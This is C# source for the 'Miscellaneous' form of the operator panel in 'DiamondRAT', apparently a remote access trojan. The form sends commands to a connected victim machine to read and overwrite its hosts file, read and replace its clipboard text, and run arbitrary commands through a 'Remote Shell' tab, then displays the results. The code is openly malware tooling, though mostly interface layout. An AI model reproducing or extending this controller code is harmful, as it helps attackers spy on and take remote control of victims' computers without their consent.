using System;
using System.ComponentModel;
using System.Windows.Forms;

namespace DiamondRAT
{
    class Miscellaneous : MyForm
    {
        private IContainer components;

        private TabControl CodePlexTabControl1;
        private TabPage TabPage1;
        private TabPage TabPage3;
        private Button btn_loadhosts;
        private Button btn_savehosts;
        private Label Label1;
        private RichTextBox RichTextBox1;
        private Button btn_getcptext;
        private Button btn_savecptext;
        private RichTextBox RichTextBox2;
        private TabPage TabPage4;
        private TextBox txt_shelloutput;
        private ComboBox cb_shellcmd;
        private SplitContainer splitContainer1;

        public Miscellaneous()
        {
            InitializeComponent();

            this.FormType = FormType.Miscellaneous;
        }

        protected override void Dispose(bool disposing)
        {
            try
            {
                if (disposing && components != null)
                {
                    components.Dispose();
                }
            }
            finally
            {
                base.Dispose(disposing);
            }
        }

        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Miscellaneous));
            this.CodePlexTabControl1 = new System.Windows.Forms.TabControl();
            this.TabPage1 = new System.Windows.Forms.TabPage();
            this.btn_loadhosts = new System.Windows.Forms.Button();
            this.btn_savehosts = new System.Windows.Forms.Button();
            this.Label1 = new System.Windows.Forms.Label();
            this.RichTextBox1 = new System.Windows.Forms.RichTextBox();
            this.TabPage3 = new System.Windows.Forms.TabPage();
            this.btn_getcptext = new System.Windows.Forms.Button();
            this.btn_savecptext = new System.Windows.Forms.Button();
            this.RichTextBox2 = new System.Windows.Forms.RichTextBox();
            this.TabPage4 = new System.Windows.Forms.TabPage();
            this.splitContainer1 = new System.Windows.Forms.SplitContainer();
            this.txt_shelloutput = new System.Windows.Forms.TextBox();
            this.cb_shellcmd = new System.Windows.Forms.ComboBox();
            this.CodePlexTabControl1.SuspendLayout();
            this.TabPage1.SuspendLayout();
            this.TabPage3.SuspendLayout();
            this.TabPage4.SuspendLayout();
            this.splitContainer1.Panel1.SuspendLayout();
            this.splitContainer1.Panel2.SuspendLayout();
            this.splitContainer1.SuspendLayout();
            this.SuspendLayout();
            // 
            // CodePlexTabControl1
            // 
            this.CodePlexTabControl1.Controls.Add(this.TabPage1);
            this.CodePlexTabControl1.Controls.Add(this.TabPage3);
            this.CodePlexTabControl1.Controls.Add(this.TabPage4);
            this.CodePlexTabControl1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.CodePlexTabControl1.Location = new System.Drawing.Point(0, 0);
            this.CodePlexTabControl1.Name = "CodePlexTabControl1";
            this.CodePlexTabControl1.SelectedIndex = 0;
            this.CodePlexTabControl1.Size = new System.Drawing.Size(776, 517);
            this.CodePlexTabControl1.TabIndex = 0;
            // 
            // TabPage1
            // 
            this.TabPage1.Controls.Add(this.btn_loadhosts);
            this.TabPage1.Controls.Add(this.btn_savehosts);
            this.TabPage1.Controls.Add(this.Label1);
            this.TabPage1.Controls.Add(this.RichTextBox1);
            this.TabPage1.Location = new System.Drawing.Point(4, 22);
            this.TabPage1.Name = "TabPage1";
            this.TabPage1.Padding = new System.Windows.Forms.Padding(3);
            this.TabPage1.Size = new System.Drawing.Size(768, 491);
            this.TabPage1.TabIndex = 0;
            this.TabPage1.Text = "Hosts File Editor";
            this.TabPage1.UseVisualStyleBackColor = true;
            // 
            // btn_loadhosts
            // 
            this.btn_loadhosts.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.btn_loadhosts.Location = new System.Drawing.Point(606, 456);
            this.btn_loadhosts.Name = "btn_loadhosts";
            this.btn_loadhosts.Size = new System.Drawing.Size(75, 28);
            this.btn_loadhosts.TabIndex = 3;
            this.btn_loadhosts.Text = "Load";
            this.btn_loadhosts.UseVisualStyleBackColor = true;
            this.btn_loadhosts.Click += new System.EventHandler(this.btn_loadhosts_Click);
            // 
            // btn_savehosts
            // 
            this.btn_savehosts.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.btn_savehosts.Location = new System.Drawing.Point(687, 456);
            this.btn_savehosts.Name = "btn_savehosts";
            this.btn_savehosts.Size = new System.Drawing.Size(75, 28);
            this.btn_savehosts.TabIndex = 2;
            this.btn_savehosts.Text = "Save";
            this.btn_savehosts.UseVisualStyleBackColor = true;
            this.btn_savehosts.Click += new System.EventHandler(this.btn_savehosts_Click);
            // 
            // Label1
            // 
            this.Label1.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)
            | System.Windows.Forms.AnchorStyles.Right)));
            this.Label1.AutoSize = true;
            this.Label1.Location = new System.Drawing.Point(9, 462);
            this.Label1.Name = "Label1";
            this.Label1.Size = new System.Drawing.Size(188, 13);
            this.Label1.TabIndex = 1;
            this.Label1.Text = "This works only with admin permission!";
            // 
            // RichTextBox1
            // 
            this.RichTextBox1.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
            | System.Windows.Forms.AnchorStyles.Left)
            | System.Windows.Forms.AnchorStyles.Right)));
            this.RichTextBox1.Location = new System.Drawing.Point(3, 6);
            this.RichTextBox1.Name = "RichTextBox1";
            this.RichTextBox1.Size = new System.Drawing.Size(762, 444);
            this.RichTextBox1.TabIndex = 0;
            this.RichTextBox1.Text = "";
            // 
            // TabPage3
            // 
            this.TabPage3.Controls.Add(this.btn_getcptext);
            this.TabPage3.Controls.Add(this.btn_savecptext);
            this.TabPage3.Controls.Add(this.RichTextBox2);
            this.TabPage3.Location = new System.Drawing.Point(4, 22);
            this.TabPage3.Name = "TabPage3";
            this.TabPage3.Size = new System.Drawing.Size(768, 491);
            this.TabPage3.TabIndex = 2;
            this.TabPage3.Text = "Clipboard Text";
            this.TabPage3.UseVisualStyleBackColor = true;
            // 
            // btn_getcptext
            // 
            this.btn_getcptext.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.btn_getcptext.Location = new System.Drawing.Point(606, 456);
            this.btn_getcptext.Name = "btn_getcptext";
            this.btn_getcptext.Size = new System.Drawing.Size(75, 28);
            this.btn_getcptext.TabIndex = 6;
            this.btn_getcptext.Text = "Load";
            this.btn_getcptext.UseVisualStyleBackColor = true;
            this.btn_getcptext.Click += new System.EventHandler(this.btn_getcptext_Click);
            // 
            // btn_savecptext
            // 
            this.btn_savecptext.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.btn_savecptext.Location = new System.Drawing.Point(687, 456);
            this.btn_savecptext.Name = "btn_savecptext";
            this.btn_savecptext.Size = new System.Drawing.Size(75, 28);
            this.btn_savecptext.TabIndex = 5;
            this.btn_savecptext.Text = "Save";
            this.btn_savecptext.UseVisualStyleBackColor = true;
            this.btn_savecptext.Click += new System.EventHandler(this.btn_savecptext_Click);
            // 
            // RichTextBox2
            // 
            this.RichTextBox2.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
            | System.Windows.Forms.AnchorStyles.Left)
            | System.Windows.Forms.AnchorStyles.Right)));
            this.RichTextBox2.Location = new System.Drawing.Point(3, 7);
            this.RichTextBox2.Name = "RichTextBox2";
            this.RichTextBox2.Size = new System.Drawing.Size(762, 443);
            this.RichTextBox2.TabIndex = 4;
            this.RichTextBox2.Text = "";
            // 
            // TabPage4
            // 
            this.TabPage4.Controls.Add(this.splitContainer1);
            this.TabPage4.Location = new System.Drawing.Point(4, 22);
            this.TabPage4.Name = "TabPage4";
            this.TabPage4.Size = new System.Drawing.Size(768, 491);
            this.TabPage4.TabIndex = 3;
            this.TabPage4.Text = "Remote Shell";
            this.TabPage4.UseVisualStyleBackColor = true;
            // 
            // splitContainer1
            // 
            this.splitContainer1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.splitContainer1.FixedPanel = System.Windows.Forms.FixedPanel.Panel2;
            this.splitContainer1.Location = new System.Drawing.Point(0, 0);
            this.splitContainer1.Name = "splitContainer1";
            this.splitContainer1.Orientation = System.Windows.Forms.Orientation.Horizontal;
            // 
            // splitContainer1.Panel1
            // 
            this.splitContainer1.Panel1.Controls.Add(this.txt_shelloutput);
            // 
            // splitContainer1.Panel2
            // 
            this.splitContainer1.Panel2.Controls.Add(this.cb_shellcmd);
            this.splitContainer1.Size = new System.Drawing.Size(768, 491);
            this.splitContainer1.SplitterDistance = 465;
            this.splitContainer1.SplitterWidth = 1;
            this.splitContainer1.TabIndex = 3;
            // 
            // txt_shelloutput
            // 
            this.txt_shelloutput.BackColor = System.Drawing.Color.Black;
            this.txt_shelloutput.Dock = System.Windows.Forms.DockStyle.Fill;
            this.txt_shelloutput.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txt_shelloutput.ForeColor = System.Drawing.Color.Silver;
            this.txt_shelloutput.Location = new System.Drawing.Point(0, 0);
            this.txt_shelloutput.MaxLength = 0;
            this.txt_shelloutput.Multiline = true;
            this.txt_shelloutput.Name = "txt_shelloutput";
            this.txt_shelloutput.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.txt_shelloutput.Size = new System.Drawing.Size(768, 465);
            this.txt_shelloutput.TabIndex = 2;
            // 
            // cb_shellcmd
            // 
            this.cb_shellcmd.Dock = System.Windows.Forms.DockStyle.Fill;
            this.cb_shellcmd.FormattingEnabled = true;
            this.cb_shellcmd.Location = new System.Drawing.Point(0, 0);
            this.cb_shellcmd.Name = "cb_shellcmd";
            this.cb_shellcmd.Size = new System.Drawing.Size(768, 21);
            this.cb_shellcmd.TabIndex = 0;
            this.cb_shellcmd.KeyDown += new System.Windows.Forms.KeyEventHandler(this.Cb_shellcmd_KeyDown);
            // 
            // Miscellaneous
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(776, 517);
            this.Controls.Add(this.CodePlexTabControl1);
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Name = "Miscellaneous";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Miscellaneous";
            this.CodePlexTabControl1.ResumeLayout(false);
            this.TabPage1.ResumeLayout(false);
            this.TabPage1.PerformLayout();
            this.TabPage3.ResumeLayout(false);
            this.TabPage4.ResumeLayout(false);
            this.splitContainer1.Panel1.ResumeLayout(false);
            this.splitContainer1.Panel1.PerformLayout();
            this.splitContainer1.Panel2.ResumeLayout(false);
            this.splitContainer1.ResumeLayout(false);
            this.ResumeLayout(false);

        }

        public override void ProcessMsg(string msg)
        {
            if (msg.StartsWith("HostsFile"))
                HostsFile(msg.Replace("HostsFile", ""));
            else if (msg.StartsWith("CPText"))
                CPText(msg.Replace("CPText", ""));
            else if (msg.StartsWith("Shell"))
                Shell(msg.Replace("Shell", ""));
        }

        private void HostsFile(string txt)
        {
            RichTextBox1.Text = txt;
        }

        private void CPText(string txt)
        {
            RichTextBox2.Text = txt;
        }

        private void Shell(string txt)
        {
            txt_shelloutput.AppendText(txt + "\r\n");
            txt_shelloutput.ScrollToCaret();
        }

        private void btn_loadhosts_Click(object sender, EventArgs e)
        {
            Connection.Send("GetHostsFile");
        }

        private void btn_savehosts_Click(object sender, EventArgs e)
        {
            Connection.Send("SaveHostsFile");
        }

        private void btn_getcpimage_Click(object sender, EventArgs e)
        {
            Connection.Send("GetCPImage");
        }

        private void btn_getcptext_Click(object sender, EventArgs e)
        {
            Connection.Send("GetCPText");
        }

        private void btn_savecptext_Click(object sender, EventArgs e)
        {
            Connection.Send("SaveCPText" + RichTextBox2.Text);
        }

        private void Cb_shellcmd_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter && !string.IsNullOrEmpty(cb_shellcmd.Text.Trim()))
            {
                string input = cb_shellcmd.Text;

                if (input == "exit")
                {
                    this.Close();
                }
                else
                {
                    Connection.Send("Shell" + cb_shellcmd.Text);
                    txt_shelloutput.AppendText("> " + cb_shellcmd.Text + "\r\n");
                    cb_shellcmd.Items.Add(input);
                }

                cb_shellcmd.Text = "";
                e.Handled = true;
                e.SuppressKeyPress = true;
            }
        }
    }
}